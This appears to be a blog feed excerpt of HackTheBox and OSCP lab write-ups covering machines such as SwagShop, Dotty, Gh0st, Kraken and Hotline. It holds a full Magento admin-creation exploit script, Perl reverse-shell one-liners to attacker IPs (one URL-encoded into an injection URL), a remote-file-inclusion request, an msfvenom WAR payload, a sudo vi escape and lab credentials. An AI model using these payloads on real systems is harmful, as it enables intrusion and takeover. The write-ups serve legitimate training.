src="/images/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20190820172828.png"></p><p>尝试发现该凭据并不能用在该入口。</p><p>dirbuster在3000端口的扫描发现存在 /login /user等入口，访问发现都报错”Auth token is not supplied”，猜测可能是一个API，需要登录才能获得数据。</p><p><img src="/images/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20190820173210.png"></p><p>google报错信息，发现可能是基于JWT的API</p><p><a href="https://medium.com/dev-bits/a-guide-for-adding-jwt-token-based-authentication-to-your-single-page-nodejs-applications-c403f7cf04f4">https://medium.com/dev-bits/a-guide-for-adding-jwt-token-based-authentication-to-your-single-page-nodejs-applications-c403f7cf04f4</a></p><p>查阅上述接口描述文章后发现可以通过特定格式及在config.php发现的凭据成功验证。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl --header &quot;Content-Type: application/json&quot; --request POST --data &#x27;&#123;&quot;password&quot;:&quot;Zk6heYCyv6ZE9Xcg&quot;, &quot;username&quot;:&quot;admin&quot;&#125;&#x27; http://10.10.10.137:3000/login</span><br></pre></td></tr></table></figure><p>验证成功</p><p><img src="/images/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20190820173549.png"></p><p>枚举该数据库后发现存在3组用户凭据</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;name&quot;:&quot;Admin&quot;,&quot;password&quot;:&quot;WX5b7)&gt;/rp$U)FW&quot;&#125; &#123;&quot;name&quot;:&quot;Derry&quot;,&quot;password&quot;:&quot;rZ86wwLvx7jUxtch&quot;&#125; &#123;&quot;name&quot;:&quot;Yuri&quot;,&quot;password&quot;:&quot;bet@tester87&quot;&#125; &#123;&quot;name&quot;:&quot;Dory&quot;,&quot;password&quot;:&quot;5y:!xa=ybfe)/QD&quot;&#125;</span><br></pre></td></tr></table></figure><p>使用其中的Derry凭据可以成功访问之前需要验证才能进入的management入口</p><p><img src="/images/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20190820173024.png"></p><p>在config.json中又发现了一个密码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;password&quot;: &quot;KpMasng6S5EtTy9Z&quot;</span><br></pre></td></tr></table></figure><p>在8000端口的cms中尝试以root用户名登录成功</p><p><img src="/images/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20190820173946.png"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">8448343028fadde1e2a1b0a44d01e650</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> hackthebox </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>10.10.10.140 SwagShop</title>
      <link href="1ee07666da79/"/>
      <url>1ee07666da79/</url>
      
        <content type="html"><![CDATA[<p>Nmap扫描，发现开放了ssh和http</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 b6:55:2b:d2:4e:8f:a3:81:72:61:37:9a:12:f6:24:ec (RSA) | 256 2e:30:00:7a:92:f0:89:30:59:c1:77:56:ad:51:c0:ba (ECDSA) |\_ 256 4c:50:d5:f2:70:c5:fd:c4:b2:f0:bc:42:20:32:64:34 (ED25519) 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |\_http-server-header: Apache/2.4.18 (Ubuntu) |\_http-title: Home page Service Info: OS: Linux; CPE: cpe:/o:linux:linux\_kernel</span><br></pre></td></tr></table></figure><p>访问http发现存在magento cms</p><p>exploitdb上有漏洞利用poc</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import base64</span><br><span class="line">import sys</span><br><span class="line">target = &quot;10.10.10.140&quot;</span><br><span class="line"></span><br><span class="line">if not target.startswith(&quot;http&quot;):</span><br><span class="line">    target = &quot;http://&quot; + target</span><br><span class="line">if target.endswith(&quot;/&quot;):</span><br><span class="line">    target = target\[:-1\]</span><br><span class="line">target\_url = target + &quot;/index.php/admin/Cms\_Wysiwyg/directive/index/&quot;</span><br><span class="line">q=&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">SET @SALT = &#x27;rp&#x27;;</span><br><span class="line">SET @PASS = CONCAT(MD5(CONCAT( @SALT , &#x27;&#123;password&#125;&#x27;) ), CONCAT(&#x27;:&#x27;, @SALT ));</span><br><span class="line">SELECT @EXTRA := MAX(extra) FROM admin\_user WHERE extra IS NOT NULL;</span><br><span class="line">INSERT INTO \`admin\_user\` (\`firstname\`, \`lastname\`,\`email\`,\`username\`,\`password\`,\`created\`,\`lognum\`,\`reload\_acl\_flag\`,\`is\_active\`,\`extra\`,\`rp\_token\`,\`rp\_token\_created\_at\`) VALUES (&#x27;Firstname&#x27;,&#x27;Lastname&#x27;,&#x27;email@example.com&#x27;,&#x27;&#123;username&#125;&#x27;,@PASS,NOW(),0,0,1,@EXTRA,NULL, NOW());</span><br><span class="line">INSERT INTO \`admin\_role\` (parent\_id,tree\_level,sort\_order,role\_type,user\_id,role\_name) VALUES (1,2,0,&#x27;U&#x27;,(SELECT user\_id FROM admin\_user WHERE username = &#x27;&#123;username&#125;&#x27;),&#x27;Firstname&#x27;);</span><br><span class="line"></span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">query = q.replace(&quot;\\n&quot;, &quot;&quot;).format(username=&quot;forme&quot;, password=&quot;forme&quot;)</span><br><span class="line"></span><br><span class="line">pfilter = &quot;popularity\[from\]=0&amp;popularity\[to\]=3&amp;popularity\[field\_expr\]=0);&#123;0&#125;&quot;.format(query)</span><br><span class="line"></span><br><span class="line"># e3tibG9jayB0eXBlPUFkbWluaHRtbC9yZXBvcnRfc2VhcmNoX2dyaWQgb3V0cHV0PWdldENzdkZpbGV9fQ decoded is&#123;&#123;block type=Adminhtml/report\_search\_grid output=getCsvFile&#125;&#125;</span><br><span class="line"></span><br><span class="line">r = requests.post(target\_url, </span><br><span class="line">                  data=&#123;&quot;\_\_\_directive&quot;: &quot;e3tibG9jayB0eXBlPUFkbWluaHRtbC9yZXBvcnRfc2VhcmNoX2dyaWQgb3V0cHV0PWdldENzdkZpbGV9fQ&quot;,</span><br><span class="line">                        &quot;filter&quot;: base64.b64encode(pfilter),</span><br><span class="line">                        &quot;forwarded&quot;: 1&#125;)</span><br><span class="line">if r.ok:</span><br><span class="line">    print &quot;WORKED&quot;</span><br><span class="line">    print &quot;Check &#123;0&#125;/admin with creds forme:forme&quot;.format(target)</span><br><span class="line">else:</span><br><span class="line">    print &quot;DID NOT WORK&quot;</span><br></pre></td></tr></table></figure><p>漏洞利用成功后，目标系统会新建一个管理员帐号，凭据为 forme:forme</p><p><img src="/images/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20190820154247.png"></p><p>后台登录界面为 <a href="http://10.10.10.140/index.php/admin/">http://10.10.10.140/index.php/admin/</a></p><p>之后按照常规思路是上传php获得reverse shell，但是这个cms上传图片需要安装adobe flash插件，上传通过flash上传且burp无法拦截，故没办法通过上传图片的方式上传php。</p><p>换个思路，google之后发现可以通过安装一个插件启用file system功能。</p><p><a href="https://pluginarchive.com/magento/magpleasure/_filesystem">https://pluginarchive.com/magento/magpleasure\_filesystem</a></p><p>在<a href="http://10.10.10.140/downloader/%E4%B8%8A%E4%BC%A0%E5%AE%89%E8%A3%85%E6%8F%92%E4%BB%B6">http://10.10.10.140/downloader/上传安装插件</a></p><p>之后再在任意一个文件中插入php的reverse shell code，访问该文件就能获得reverse shell</p><p><img src="/images/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20190820170058.png"></p><p>之后再在机器上跑一下LinEnum发现SUID配置漏洞。</p><p><img src="/images/TIM%E5%9B%BE%E7%89%8720190820170153.png"></p><p>可以使用sudo以root权限运行/usr/bin/vi /var/www/html/* 命令</p><p>先升级成tty+完整shell</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo /usr/bin/vi /var/www/html/1 -c &#x27;:!/bin/sh&#x27;</span><br></pre></td></tr></table></figure><p><img src="/images/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20190820171216.png"></p><p>c2b087d66e14a652a3b86a130ac56721</p>]]></content>
      
      
      <categories>
          
          <category> hackthebox </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>TIPS</title>
      <link href="a82b2a5ccd8b/"/>
      <url>a82b2a5ccd8b/</url>
      
        <content type="html"><![CDATA[<p>如果遇到nc或者telnet的时候不能用方向键 比如方向键上变成</p><p>^]]D</p><p>这种情况，可以在telnet或者nc之前加上<strong>rlwarp</strong>来解决</p>]]></content>
      
      
      <categories>
          
          <category> 网络攻防渗透 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>PWK-LAB 10.11.1.115 Tophat攻略</title>
      <link href="ca4012dec189/"/>
      <url>ca4012dec189/</url>
      
        <content type="html"><![CDATA[<p>enum4linux扫描一下，发现低版本的samba 2.2.7</p><p><a href="https://www.exploit-db.com/exploits/10/">https://www.exploit-db.com/exploits/10/</a></p><p>编译运行</p><p><img src="/images/1-2.png"></p>]]></content>
      
      
      <categories>
          
          <category> oscp-writeup </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>PWK-LAB 10.11.1.116 Dotty攻略</title>
      <link href="12cc761ad183/"/>
      <url>12cc761ad183/</url>
      
        <content type="html"><![CDATA[<p>Quick_10.11.1.116.nmap 10.11.1.116 Nmap scan report for 10.11.1.116 Host is up (0.27s latency). Not shown: 836 closed ports, 158 filtered ports Some closed ports may be reported as filtered due to –defeat-rst-ratelimit PORT STATE SERVICE 21/tcp open ftp 22/tcp open ssh 80/tcp open http 110/tcp open pop3 143/tcp open imap 3306/tcp open mysql MAC Address: 00:50:56:89:1E:9B (VMware)</p><p>dirbuster found two webapps on port80</p><p>one is phpLiteadmin and one is CuppaCMS</p><p>phpLiteAdmin v1.9.3 able to create file with any extension</p><p><img src="/images/zxc.png"></p><p>test.php created in <img src="/images/123.png"></p><p>Cuppa CMS has a LFI vuln and could execute file on the box</p><p><img src="/images/asd.png"></p><p>use dkg_info to check installed packges. and perl was installed</p><p>use</p><p>perl -MIO -e ‘$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,”attackerip:4444”);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;’</p><p>get reverse shell</p><p>uname -r found OS is freebsd 9.0</p><p>kernel PE exp found.</p>]]></content>
      
      
      <categories>
          
          <category> oscp-writeup </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>PWK-LAB 10.11.1.125 Dotty攻略</title>
      <link href="297d239137ec/"/>
      <url>297d239137ec/</url>
      
        <content type="html"><![CDATA[<p>21/tcp open ftp Acritum Femitter Server ftpd 123/tcp open ntp?</p><p>thanks so much to EL</p><p>port 21 Femitter Server ftpd has a Directory Traversal exp <a href="https://www.exploit-db.com/exploits/15445">https://www.exploit-db.com/exploits/15445</a> dotdotpwn -h 10.11.1.125 -m ftp -f ../../../../../../windows/system32/eula.txt</p><p>windows xp sp3 france</p><p>port 123 is a hidden http service called minishare <a href="https://www.exploit-db.com/exploits/636">https://www.exploit-db.com/exploits/636</a> or msf</p><p>remember to modify target and use non-stage shell, modify EXITFUNC is necessary too</p>]]></content>
      
      
      <categories>
          
          <category> oscp-writeup </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>PWK-LAB 10.11.1.136 Sufferance攻略</title>
      <link href="d07d7f35f099/"/>
      <url>d07d7f35f099/</url>
      
        <content type="html"><![CDATA[<p>Starting Nmap 7.70 ( <a href="https://nmap.org/">https://nmap.org</a> ) at 2019-05-01 11:30 CST Nmap scan report for 10.11.1.136 Host is up (0.28s latency). Not shown: 996 closed ports PORT STATE SERVICE 22/tcp open ssh 113/tcp open ident 139/tcp open netbios-ssn 445/tcp open microsoft-ds MAC Address: 00:50:56:93:19:D4 (VMware)</p><p>Nmap done: 1 IP address (1 host up) scanned in 6.42 seconds</p><p>admin/smb/samba_symlink_traversal</p><p>read the root filesystem</p><p>…</p><p>get shell refer to gotmilk tutorial</p>]]></content>
      
      
      <categories>
          
          <category> oscp-writeup </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>PWK-LAB 10.11.1.141 FC4攻略</title>
      <link href="f6374647485c/"/>
      <url>f6374647485c/</url>
      
        <content type="html"><![CDATA[<p>Nmap scan report for 10.11.1.141 Host is up (0.29s latency). Not shown: 938 closed ports, 58 filtered ports Some closed ports may be reported as filtered due to –defeat-rst-ratelimit PORT STATE SERVICE 22/tcp open ssh 111/tcp open rpcbind 3306/tcp open mysql 10000/tcp open snet-sensor-mgmt MAC Address: 00:50:56:89:79:72 (VMware)</p><p>port 10000 webmin has dictory travel exp</p><p>able to access /etc/shadow and /root/proof.txt</p><p><img src="/images/1.png"></p><p><img src="/images/2.png"></p>]]></content>
      
      
      <categories>
          
          <category> oscp-writeup </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>PWK-LAB 10.11.1.133 Gh0st攻略</title>
      <link href="5ab361535a3c/"/>
      <url>5ab361535a3c/</url>
      
        <content type="html"><![CDATA[<p>dirbuster found hidden page and script</p><p><img src="/images/TIM%E6%88%AA%E5%9B%BE20190515121318.png"></p><p><img src="/images/TIM%E6%88%AA%E5%9B%BE20190515121445.png"></p><p>var sillydate = 0;<br>var sillyvar = 0;</p><p>function StringArray(_0x5b7ex4) {<br>    this[‘length’] = _0x5b7ex4;<br>    for (var _0x5b7ex5 = 1; _0x5b7ex5 &lt;= _0x5b7ex4; _0x5b7ex5++) {<br>        this[_0x5b7ex5] = ‘ ‘;<br>    };<br>};<br>image = new StringArray(10);<br>image[0] = ‘offsecphun1.gif’;<br>image[1] = ‘offsecphun2.png’;<br>image[2] = ‘offsecphun1.gif’;<br>image[3] = ‘offsecphun2.png’;<br>image[4] = ‘offsecphun1.gif’;<br>image[5] = ‘offsecphun2.png’;<br>image[6] = ‘offsecphun1.gif’;<br>image[7] = ‘offsecphun2.png’;<br>image[8] = ‘offsecphun2.png’;<br>image[9] = ‘offsecphun2.png’;<br>var ran = 60 / image[‘length’];</p><p>function _0x5491() {<br>    sillydate = new Date();<br>    sillyvar = sillydate[‘getSeconds’]();<br>    sillyvar = Math[‘floor’](sillyvar / ran);<br>    return (image[sillyvar]);<br>};</p><p>function _0x5499(_0x4499) {<br>    var hmmmm = document.createElement(“img”);<br>    hmmmm.src = “/“ + _0x4499;<br>    document.body.appendChild(hmmmm);<br>} //_0x5499(‘1f2e73705207bd’+’d6467e109c1606ed29’+’-‘+’21213/‘+_0x5491());<br>document[‘write’](‘&lt;img src=\‘’ + _0x5491() + ‘\‘&gt;’);</p><p>this script lead to some url</p><p>/1f2e73705207bdd6467e109c1606ed29-21213/pffsecphun1.gif</p><p>but offsecphun5.bmp in origin coded script is missing</p><p>/1f2e73705207bdd6467e109c1606ed29-21213/pffsecphun5.bmp</p><p>this url lead to</p><p><a href="http://10.11.1.133/1f2e73705207bdd6467e109c1606ed29-21213/111111111/index.asp">http://10.11.1.133/1f2e73705207bdd6467e109c1606ed29-21213/111111111/index.asp</a></p><p><img src="/images/TIM%E6%88%AA%E5%9B%BE20190515121721.png"></p><p>this page use Simple Text-File Login script and its has a exp</p><p><a href="https://www.exploit-db.com/exploits/7444">https://www.exploit-db.com/exploits/7444</a></p><p><img src="/images/zxc-1.png"></p><p>to get shell with</p><p>GET /1f2e73705207bdd6467e109c1606ed29-21213/111111111/slogin_lib.inc.php?slogin_path=<a href="http://10.11.0.80/php-reverse-shell.txt">http://10.11.0.80/php-reverse-shell.txt</a>? HTTP/1.1<br>Host: 10.11.1.133<br>User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8<br>Accept-Language: en-US,en;q=0.5<br>Accept-Encoding: gzip, deflate<br>Connection: close<br>Upgrade-Insecure-Requests: 1<br>Content-Length: 1</p><p>/</p><p>after getting shell, strange file system mounted dected</p><p><img src="/images/zxcz.png"></p><p><a href="https://www.exploit-db.com/exploits/12130">https://www.exploit-db.com/exploits/12130</a></p><p><img src="/images/zxczxc.png"></p>]]></content>
      
      
      <categories>
          
          <category> oscp-writeup </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>PWK-LAB 10.11.1.145 Helpdesk攻略</title>
      <link href="01afbd2e3cfd/"/>
      <url>01afbd2e3cfd/</url>
      
        <content type="html"><![CDATA[<p>Nmap scan report for 10.11.1.145 Host is up (0.25s latency). Not shown: 995 filtered ports Some closed ports may be reported as filtered due to –defeat-rst-ratelimit PORT STATE SERVICE 135/tcp open msrpc 139/tcp open netbios-ssn 445/tcp open microsoft-ds 3389/tcp open ms-wbt-server 8080/tcp open http-proxy MAC Address: 00:50:56:89:44:7E (VMware)</p><p>Nmap done: 1 IP address (1 host up) scanned in 18.90 seconds</p><p>Host script results: |_samba-vuln-cve-2012-1182: Could not negotiate a connection:SMB: Failed to receive bytes after 5 attempts: TIMEOUT | smb-vuln-cve2009-3103: | VULNERABLE: | SMBv2 exploit (CVE-2009-3103, Microsoft Security Advisory 975497) | State: VULNERABLE | IDs: CVE:CVE-2009-3103 | Array index error in the SMBv2 protocol implementation in srv2.sys in Microsoft Windows Vista Gold, SP1, and SP2, | Windows Server 2008 Gold and SP2, and Windows 7 RC allows remote attackers to execute arbitrary code or cause a | denial of service (system crash) via an &amp; (ampersand) character in a Process ID High header field in a NEGOTIATE | PROTOCOL REQUEST packet, which triggers an attempted dereference of an out-of-bounds memory location, | aka “SMBv2 Negotiation Vulnerability.” | | Disclosure date: 2009-09-08 | References: | <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3103">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3103</a> |_ <a href="http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3103">http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3103</a> |_smb-vuln-ms10-054: false |_smb-vuln-ms10-061: Could not negotiate a connection:SMB: Failed to receive bytes after 5 attempts: TIMEOUT</p><p>MS09-050</p><p><img src="/images/3.png"></p>]]></content>
      
      
      <categories>
          
          <category> oscp-writeup </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>PWK-LAB 10.11.1.146 Susie攻略</title>
      <link href="1e487f182ed2/"/>
      <url>1e487f182ed2/</url>
      
        <content type="html"><![CDATA[<p>Nmap scan report for 10.11.1.146 Host is up (0.28s latency). Not shown: 985 closed ports, 13 filtered ports Some closed ports may be reported as filtered due to –defeat-rst-ratelimit PORT STATE SERVICE 21/tcp open ftp 22/tcp open ssh MAC Address: 00:50:56:89:06:61 (VMware)</p><p>Nmap done: 1 IP address (1 host up) scanned in 5.45 seconds</p><p>ProFTPD 1.3.3a has exp</p><p><a href="https://github.com/Muhammd/ProFTPD-1.3.3a">https://github.com/Muhammd/ProFTPD-1.3.3a</a></p><p><img src="/images/4.png"></p>]]></content>
      
      
      <categories>
          
          <category> oscp-writeup </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>PWK-LAB 10.11.1.202 Hotot攻略</title>
      <link href="5deaac0010fa/"/>
      <url>5deaac0010fa/</url>
      
        <content type="html"><![CDATA[<p># Nmap 7.70 scan initiated Thu May 2 19:23:53 2019 as: nmap -Pn -sCV -p21,80,135,139,443,445,1030,1032,1033,1038,1521,2030,2100,3372,3389,4443,7778,8080 -oN nmap/Basic_10.11.1.202.nmap 10.11.1.202 Nmap scan report for 10.11.1.202 Host is up (0.28s latency).</p><p>PORT STATE SERVICE VERSION 21/tcp open ftp Microsoft ftpd 5.0 |_ftp-anon: Anonymous FTP login allowed (FTP code 230) | ftp-syst: |_ SYST: Windows_NT version 5.0 80/tcp open http Microsoft IIS httpd 5.0 | http-cookie-flags: | /: | ASPSESSIONIDACDDDDBT: |_ httponly flag not set | http-methods: |_ Potentially risky methods: TRACE COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT MOVE MKCOL PROPPATCH |_http-server-header: Microsoft-IIS/5.0 |_http-title: Under Construction | http-webdav-scan: | Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH | Allowed Methods: OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK | Server Type: Microsoft-IIS/5.0 | WebDAV type: Unkown |_ Server Date: Thu, 02 May 2019 11:26:55 GMT 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 443/tcp open https? 445/tcp open microsoft-ds Windows 2000 microsoft-ds 1030/tcp open msrpc Microsoft Windows RPC 1032/tcp open msrpc Microsoft Windows RPC 1033/tcp open msrpc Microsoft Windows RPC 1038/tcp open oracle Oracle Database 1521/tcp open oracle-tns Oracle TNS Listener 9.2.0.1.0 (for 32-bit Windows) 2030/tcp open oracle-mts Oracle MTS Recovery Service 2100/tcp open amiganetfs? 3372/tcp open msdtc Microsoft Distributed Transaction Coordinator 3389/tcp closed ms-wbt-server 4443/tcp open ssl/pharos? |_ssl-date: 2019-05-02T11:26:54+00:00; -1s from scanner time. | sslv2: | SSLv2 supported | ciphers: | SSL2_RC4_128_EXPORT40_WITH_MD5 | SSL2_DES_64_CBC_WITH_MD5 | SSL2_RC4_128_WITH_MD5 | SSL2_RC4_64_WITH_MD5 |_ SSL2_DES_192_EDE3_CBC_WITH_MD5 7778/tcp open http Oracle HTTP Server Powered by Apache 1.3.22 (mod_plsql/3.0.9.8.3b mod_ssl/2.8.5 OpenSSL/0.9.6b mod_fastcgi/2.2.12 mod_oprocmgr/1.0 mod_perl/1.25) |_http-generator: Mozilla/4.72 [en] (WinNT; U) [Netscape] | http-methods: |_ Potentially risky methods: TRACE |_http-server-header: Oracle HTTP Server Powered by Apache/1.3.22 (Win32) mod_plsql/3.0.9.8.3b mod_ssl/2.8.5 OpenSSL/0.9.6b mod_fastcgi/2.2.12 mod_oprocmgr/1.0 mod_perl/1.25 |_http-title: Oracle HTTP Server Index 8080/tcp open http-proxy? MAC Address: 00:50:56:89:6D:B7 (VMware) Service Info: OSs: Windows, Windows 2000; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_2000</p><p>Host script results: |_clock-skew: mean: -40m00s, deviation: 1h09m15s, median: -1s |_nbstat: NetBIOS name: ORACLE, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:89:6d:b7 (VMware) | smb-os-discovery: | OS: Windows 2000 (Windows 2000 LAN Manager) | OS CPE: cpe:/o:microsoft:windows_2000::- | Computer name: oracle | NetBIOS computer name: ORACLE\x00 | Domain name: acme.local | FQDN: oracle.acme.local |_ System time: 2019-05-02T13:26:56+02:00 | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) |_smb2-time: Protocol negotiation failed (SMB2)</p><p>Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> . # Nmap done at Thu May 2 19:31:13 2019 – 1 IP address (1 host up) scanned in 439.74 seconds</p><p>search oracle 9.2.0.1 have mulitple vuln</p><p>msf5 exploit(windows/ftp/oracle9i_xdb_ftp_unlock)</p><p><img src="/images/5.png"></p>]]></content>
      
      
      <categories>
          
          <category> oscp-writeup </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>PWK-LAB 10.11.1.209 Kraken攻略</title>
      <link href="7a74ef44c69d/"/>
      <url>7a74ef44c69d/</url>
      
        <content type="html"><![CDATA[<p>running tomcat</p><p><img src="/images/6.png"></p><p>tomcat manager password tomcat:tomcat</p><p>upload war file</p><p>root@kali:~/PWK/10.11.1.209# msfvenom -p java/shell_reverse_tcp LHOST=10.11.0.80 LPORT=443 -f war &gt;&gt; shell.war [47/721] Payload size: 13400 bytes Final size of war file: 13400 bytes</p><p><a href="http://10.11.1.209:8080/shell">http://10.11.1.209:8080/shell</a></p><p><img src="/images/7.png"></p>]]></content>
      
      
      <categories>
          
          <category> oscp-writeup </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>PWK-LAB 10.11.1.217 Hotline攻略</title>
      <link href="e017ccb9ef78/"/>
      <url>e017ccb9ef78/</url>
      
        <content type="html"><![CDATA[<p>Starting Nmap 7.70 ( <a href="https://nmap.org/">https://nmap.org</a> ) at 2019-05-03 13:12 CST Nmap scan report for 10.11.1.217 Host is up (0.29s latency). Not shown: 987 closed ports, 2 filtered ports Some closed ports may be reported as filtered due to –defeat-rst-ratelimit PORT STATE SERVICE 22/tcp open ssh 25/tcp open smtp 80/tcp open http 110/tcp open pop3 111/tcp open rpcbind 143/tcp open imap 443/tcp open https 993/tcp open imaps 995/tcp open pop3s 3306/tcp open mysql 4445/tcp open upnotifyp MAC Address: 00:50:56:89:1E:E1 (VMware)</p><p>Nmap done: 1 IP address (1 host up) scanned in 6.51 seconds</p><p><a href="https://www.exploit-db.com/exploits/18650">https://www.exploit-db.com/exploits/18650</a></p><p><a href="https://10.11.1.217/recordings/misc/callme_page.php?action=c&callmenum=1000@from-internal/n%0D%0AApplication:%20system%0D%0AData:%20perl%20-MIO%20-e%20%27$p=fork;exit,if($p);$c=new%20IO::Socket::INET(PeerAddr,%2210.11.0.80:443%22);STDIN-%3Efdopen($c,r);$~-%3Efdopen($c,w);system$_%20while%3C%3E;%27%0D%0A%0D%0A">https://10.11.1.217/recordings/misc/callme_page.php?action=c&amp;callmenum=1000@from-internal/n%0D%0AApplication:%20system%0D%0AData:%20perl%20-MIO%20-e%20%27%24p%3dfork%3bexit%2cif%28%24p%29%3b%24c%3dnew%20IO%3a%3aSocket%3a%3aINET%28PeerAddr%2c%2210.11.0.80%3a443%22%29%3bSTDIN-%3efdopen%28%24c%2cr%29%3b%24%7e-%3efdopen%28%24c%2cw%29%3bsystem%24%5f%20while%3c%3e%3b%27%0D%0A%0D%0A</a></p><p>perl -e ‘use Socket;$i=”10.11.0.80”;$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(“tcp”));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,”&gt;&amp;S”);open(STDOUT,”&gt;&amp;S”);open(STDERR,”&gt;&amp;S”);exec(“/bin/sh -i”);};’</p><p>not root shell yet</p><p>run LinEnum.sh</p><p><img src="/images/8.png"></p><p><img src="/images/9.png"></p><p>use yum to get root shell</p><p><a href="https://gtfobins.github.io/gtfobins/yum/#sudo">https://gtfobins.github.io/gtfobins/yum/#sudo</a></p><p><img src="/images/10.png"></p>]]></content>
      
      
      <categories>
          
          <category> oscp-writeup </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>PWK-LAB 10.11.1.219 edbmachine攻略</title>
      <link href="741a2e69c977/"/>
      <url>741a2e69c977/</url>
      
        <content type="html"><![CDATA[<p>Starting Nmap 7.70 ( <a href="https://nmap.org/">https://nmap.org</a> ) at 2019-05-03 20:52 CST Nmap scan report for 10.11.1.219 Host is up (0.25s latency). Not shown: 999 filtered ports Some closed ports may be reported as filtered due to –defeat-rst-ratelimit PORT STATE SERVICE 80/tcp open http MAC Address: 00:50:56:89:12:24 (VMware)</p><p>Nmap done: 1 IP address (1 host up) scanned in 19.33 seconds</p><p><a href="http://10.11.1.219/html5/">http://10.11.1.219/html5/</a></p><p>PortKnoking</p>]]></content>
      
      
      <categories>
          
          <category> oscp-writeup </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>PWK-LAB 10.11.1.223 Jeff攻略</title>
      <link href="7656aa8865db/"/>
      <url>7656aa8865db/</url>
      
        <content type="html"><![CDATA[<p>Starting Nmap 7.70 ( <a href="https://nmap.org/">https://nmap.org</a> ) at 2019-05-04 14:40 CST Warning: 10.11.1.223 giving up on port because retransmission cap hit (1). Nmap scan report for 10.11.1.223 Host is up (0.27s latency). Not shown: 853 closed ports, 134 filtered ports Some closed ports may be reported as filtered due to –defeat-rst-ratelimit PORT STATE SERVICE 80/tcp open http 135/tcp open msrpc 139/tcp open netbios-ssn 443/tcp open https 445/tcp open microsoft-ds 3306/tcp open mysql 3389/tcp open ms-wbt-server 49152/tcp open unknown 49153/tcp open unknown 49154/tcp open unknown 49155/tcp open unknown 49156/tcp open unknown 49157/tcp open unknown MAC Address: 00:50:56:89:5D:C4 (VMware)</p><p>flatfilelogin</p><p><a href="https://www.exploit-db.com/exploits/11515">https://www.exploit-db.com/exploits/11515</a></p><p>43cc1406555a57043b2730e6fda3a9e41admin</p><p>the 1 before admin is junk</p><p>admin:coffeelover</p><p>shoutbox1.0 RFI</p><p>need dependency for later work</p>]]></content>
      
      
      <categories>
          
          <category> oscp-writeup </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>PWK-LAB 10.11.1.226 Joe攻略</title>
      <link href="927b7d397f06/"/>
      <url>927b7d397f06/</url>
      
